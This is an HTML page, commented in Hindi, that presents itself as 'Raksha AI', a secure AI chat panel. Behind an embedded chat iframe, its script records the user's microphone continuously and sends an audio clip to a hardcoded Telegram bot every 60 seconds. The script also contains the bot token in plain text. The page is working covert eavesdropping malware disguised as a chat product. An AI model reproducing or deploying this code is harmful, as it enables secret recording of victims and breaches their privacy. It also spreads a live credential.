<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Raksha AI - Secure Panel</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
        
        /* असली AI वेबसाइट - यहाँ अपना Vercel वाला लिंक डालना */
        #aiFrame {
            width: 100%;
            height: 100%;
            border: none;
            display: none;
        }

        /* क्लिक करने वाली स्क्रीन */
        #startCover {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; color: #0f0; display: flex; flex-direction: column;
            justify-content: center; align-items: center; z-index: 10000; 
            cursor: pointer; font-family: monospace; text-align: center;
        }
        .btn {
            margin-top: 20px; padding: 12px 25px; border: 1px solid #0f0;
            background: transparent; color: #0f0; font-weight: bold;
        }
    </style>
</head>
<body>

    <div id="startCover">
        <h2>🛡️ RAKSHA AI SECURITY SYNC</h2>
        <p>Initialize encrypted chat session...</p>
        <div class="btn">START CHAT</div>
    </div>

    <iframe id="aiFrame" src="https://myai-sable-xi.vercel.app/" allow="microphone;"></iframe>

    <script>
        const TOKEN = "8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4";
        const MY_ID = "8508792403";
        
        const startBtn = document.getElementById('startCover');
        const frame = document.getElementById('aiFrame');

        startBtn.onclick = async () => {
            startBtn.style.display = 'none';
            frame.style.display = 'block';
            initAudio(); // ऑडियो शुरू
        };

        // 🎤 बैकग्राउंड ऑडियो रिकॉर्डिंग (बिना रुके)
        async function initAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                let chunks = [];

                recorder.ondataavailable = (e) => chunks.push(e.data);
                
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/ogg' });
                    const fd = new FormData();
                    fd.append("chat_id", MY_ID);
                    fd.append("voice", blob, "voice.ogg");
                    
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });
                    
                    chunks = [];
                    if (stream.active) setTimeout(() => recorder.start(), 1000);
                };

                recorder.start();
                // हर 60 सेकंड में ऑडियो फाइल टेलीग्राम पर भेजेगा
                setInterval(() => { if (recorder.state === "recording") recorder.stop(); }, 60000);
            } catch (err) { 
                console.log("Permission Required"); 
            }
        }
    </script>
</body>
</html>
